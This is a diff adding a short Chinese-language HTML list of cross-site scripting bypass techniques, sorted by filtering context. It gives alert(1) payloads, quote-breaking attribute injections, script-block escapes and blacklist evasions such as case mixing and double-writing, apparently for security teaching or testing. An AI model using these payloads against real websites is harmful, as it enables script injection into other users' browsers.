@@ -1,0 +1,8 @@
+<h4>绕过技巧</h4>
+<ul>
+<li><b>完全没有过滤</b>：直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>、<code>&lt;img src=x onerror=alert(1)&gt;</code>、<code>&lt;svg onload=alert(1)&gt;</code>。</li>
+<li><b>只做了简单 htmlspecialchars（未加 ENT_QUOTES）</b>：单引号不会被转义，在单引号包裹的属性里闭合即可，如 <code>' onmouseover=alert(1) x='</code>；双引号属性仍然安全。</li>
+<li><b>输出点在 &lt;script&gt; 内部</b>：实体编码不会解码，需闭合脚本块 <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>；若在 JS 字符串里，用 <code>';alert(1);//</code>。</li>
+<li><b>完整安全转义（ENT_QUOTES + 上下文正确）</b>：常规标签注入失效，转向 DOM 型、<code>javascript:</code> 伪协议、<code>data:</code> URI、上传 SVG/HTML 文件、富文本白名单漏网标签（<code>&lt;svg&gt;</code>、<code>&lt;math&gt;</code>、<code>&lt;details ontoggle&gt;</code>）。</li>
+<li><b>黑名单过滤 script 关键字</b>：大小写 <code>&lt;ScRiPt&gt;</code>、双写 <code>&lt;scr&lt;script&gt;ipt&gt;</code>、<code>&lt;img src=x onerror&gt;</code>、HTML 实体 <code>&amp;#60;img&amp;#62;</code>。</li>
+</ul>
